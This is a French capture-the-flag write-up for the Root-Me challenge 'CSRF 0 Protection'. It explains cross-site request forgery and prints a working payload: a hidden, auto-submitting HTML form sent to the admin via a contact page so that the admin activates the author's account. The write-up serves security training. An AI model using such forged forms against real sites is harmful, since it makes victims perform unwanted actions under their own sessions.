# Writeup -- CSRF 0 Protection 

## Catégorie

Web - Client

## Énoncé

Activez votre compte pour accéder à l’espace privé de l’intranet.

## Choses à savoir 

Lorsqu'on essaie d'activer un compte, valider un artcile etc, on peut essayer d'exploiter des vulnérabilités CSRF. 
Cette attaque consiste en l'envoi d'un forms HTLM visant à exécuter une action par la personne affichant notre message.

ici, on crée un forms HTLM contenant la requête permettant d'activer notre compte, qu'on met dans un message envoyé à l'admin. 

## Exploitation

On cherche à activer notre compte

Une fois connecté, on retrouve cette page :
```
http://challenge01.root-me.org/web-client/ch22/?action=contact
```
Cette page nous permet d'envoyer un mail à l'admin. C'est ici qu'on veut injecter notre forms.

On essaie d'abord de comprendre quelle requête il faut que l'admin envoie pour activer notre compte.

Pour ça, on peut essayer de valider nous-même le compte depuis le profil, et capturer la requête avec burp suite pour la comprendre : 

http://challenge01.root-me.org/web-client/ch22/?action=contact

On voit deux paramètres dans cette requête, le username (test) et le status (on)

C'est ce qu'on veut que l'admin exécute. On crée donc un forms HTML à envoyer en message à l'admin :
```
"><form id=csrf method="POST" action="/web-client/ch22/?action=profile" enctype="multipart/form-data" target="x">
<input type="hidden" name="username" value="test">
<input type="hidden" name="status" value="on">
</form><iframe name="x" style="display:none"></iframe>
<script>document.getElementById('csrf').submit();</script>
```
On envoie ce message avec une adresse mail aléatoire, puis on attend, et on retrouve le flag dans l'onglet Private :

<img width="244" height="65" alt="flag" src="https://github.com/user-attachments/assets/b7f7c80b-d8fc-4b09-b5ca-bb96ff8b7dab" />

On peut valider le challenge avec ce flag
